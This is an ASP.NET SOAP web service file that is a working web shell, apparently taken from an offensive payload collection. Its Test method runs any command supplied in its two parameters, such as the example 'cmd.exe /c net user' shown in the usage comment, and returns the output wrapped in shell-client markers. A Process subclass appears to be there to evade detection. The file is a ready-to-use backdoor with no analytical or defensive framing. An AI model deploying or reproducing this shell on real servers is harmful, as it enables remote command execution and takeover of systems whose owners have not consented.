<%--

Usage:

POST /test.asmx HTTP/1.1
Host: example.com
Content-Type: text/xml; charset=utf-8
Content-Length: 363
SOAPAction: "http://tempuri.org/Test"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Test xmlns="http://tempuri.org/">
      <Z1>cmd.exe</Z1>
      <Z2>/c net user</Z2>
    </Test>
  </soap:Body>
</soap:Envelope>

--%>

<%@ WebService Language="C#" Class="Service" %>
using System;
using System.Web;
using System.IO;
using System.Net;
using System.Text;
using System.Data;
using System.Data.SqlClient;
using System.Collections.Generic;
using System.Diagnostics;
using System.Web.SessionState;
using System.Web.Services;
using System.Xml;
using System.Web.Services.Protocols;

[WebService(Namespace = "http://www.payloads.online/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]

public class New_Process :Process
{
    public New_Process(string s)
    {
            
    }

}


public class Service : System.Web.Services.WebService
{
    public Service()
    {

    }

    [WebMethod]
    public string Test(string Z1,string Z2)
    {
        String R;

        ProcessStartInfo c = new ProcessStartInfo(Z1,Z2);
        Process e = new New_Process("something");
        StreamReader OT, ER;
        c.UseShellExecute = false;
        c.RedirectStandardOutput = true;
        c.RedirectStandardError = true;
        e.StartInfo = c;
        
        e.Start();
        OT = e.StandardOutput;
        ER = e.StandardError;
        e.Close();
        R = OT.ReadToEnd() + ER.ReadToEnd();
        HttpContext.Current.Response.Clear();
        HttpContext.Current.Response.Write("<?xml version=\"1.0\" encoding=\"utf-8\"?>");
        HttpContext.Current.Response.Write("<data>");
        HttpContext.Current.Response.Write("<![CDATA[");
        HttpContext.Current.Response.Write("\x2D\x3E\x7C");
        HttpContext.Current.Response.Write(R);
        HttpContext.Current.Response.Write("\x7C\x3C\x2D");
        HttpContext.Current.Response.Write("]]>");
        HttpContext.Current.Response.Write("</data>");
        HttpContext.Current.Response.End();
        return R;
    }
}
